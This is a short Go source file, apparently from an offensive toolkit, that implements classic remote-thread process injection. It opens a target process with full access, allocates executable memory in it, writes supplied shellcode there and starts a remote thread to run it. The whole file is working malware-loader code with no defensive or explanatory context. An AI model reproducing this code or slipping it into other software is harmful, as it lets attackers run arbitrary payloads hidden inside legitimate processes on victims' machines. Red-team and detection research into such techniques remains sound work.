package inject

import (
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func CreatRemoteThreadInject(pid int, shellcode []byte) {
	handle, err := xwindows.OpenProcess(
		xwindows.PROCESS_ALL_ACCESS,
		false,
		uint32(pid),
	)
	if err != nil {
		log.Fatalf("OpenProcess: %v", err)
	}

	allocMem, err := xwindows.VirtualAllocEx(
		handle,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		log.Fatalf("VirtualAllocEx: %v", err)
	}

	var bytesWritten uintptr
	err = xwindows.WriteProcessMemory(
		handle,
		allocMem,
		&shellcode[0],
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil {
		log.Fatalf("WriteProcessMemory: %v", err)
	}

	_, err = xwindows.CreateRemoteThread(
		handle,
		uintptr(0),
		uintptr(0),
		allocMem,
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if err != nil {
		log.Fatalf("CreateRemoteThread: %v", err)
	}

}
